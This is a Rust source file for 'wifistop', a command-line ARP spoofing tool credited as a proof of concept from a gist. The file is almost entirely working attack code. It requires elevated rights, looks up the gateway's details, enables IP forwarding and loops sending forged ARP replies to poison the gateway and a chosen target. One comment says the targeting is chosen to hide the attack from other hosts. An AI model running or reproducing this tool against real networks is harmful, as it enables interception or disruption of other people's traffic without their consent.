//! wifistop
//!
//! ARP spoofing attack
//!
//! PoC from https://gist.github.com/apsun/4ddc09f40c0c65191b8cdee1e09ba70f
use pnet::datalink::{Channel, Config, MacAddr};
use pnet::packet::arp::ArpOperations;
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::time::Duration;
use std::{env, io, process};

mod arp;
mod inet;
mod utils;

const BROADCAST_MAC: MacAddr = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
const ARP_PERIOD_MS: u64 = 500;

fn main() {
    if !utils::os::is_windows() {
        if !utils::nix::is_elevated() {
            panic!("Requires elevation")
        }
    }

    let target_ip = match env::args().nth(1) {
        Some(n) => n,
        None => {
            println!("USAGE: wifistop <IP>");
            process::exit(1);
        }
    };

    utils::log::head();
    wait!("Fetching device info");

    let self_ip = inet::self_ip();
    let self_mac = inet::self_mac();

    done!("Device IP: {}", self_ip);
    done!("Device MAC address: {}", self_mac);

    wait!("Fetching gateway info");

    let gateway_ip = inet::gateway_ip();
    let gateway_mac = inet::gateway_mac();

    done!("Gateway IP: {}", gateway_ip);
    done!("Gateway MAC address: {}", gateway_mac);

    println!();

    inet::ip_forward(true);
    let _cleanup = Cleanup;

    info!("Attacking gateway ({})", inet::gateway_ip());
    info!("Attacking {}", target_ip);

    let mut set = HashSet::new();
    set.insert(inet::gateway_ip());
    set.insert(Ipv4Addr::from_str(&*target_ip).unwrap());

    attack(set);
}

fn attack(targets: HashSet<Ipv4Addr>) {
    let mut cfg = Config::default();
    cfg.read_timeout = Some(Duration::from_secs(0));
    let (mut tx, mut rx) = match pnet::datalink::channel(&inet::default_interface(), cfg) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error happened {}", e),
    };

    loop {
        // Send a gratuitous ARP request. If we're pretending to be the gateway,
        // broadcast it to all hosts in the network. Otherwise, only send it to
        // the gateway, to prevent other hosts from detecting the attack.
        for host in targets.iter() {
            let dest_mac = if *host == inet::gateway_ip() {
                BROADCAST_MAC
            } else {
                inet::gateway_mac()
            };

            arp::send_arp_packet(arp::WSArpPacket {
                tx: &mut *tx,
                src_ip: *host,
                src_mac: inet::self_mac(),
                dest_ip: *host,
                dest_mac,
                op: ArpOperations::Reply,
            })
            .expect("Failed to send ARP packet");
        }
        info!("Attacking {} host(s)", targets.len());

        // Delay for a bit to prevent flooding the network
        // with ARP packets
        std::thread::sleep(Duration::from_millis(ARP_PERIOD_MS));
    }
}

struct Cleanup;

impl Drop for Cleanup {
    fn drop(&mut self) {
        inet::ip_forward(false);
    }
}
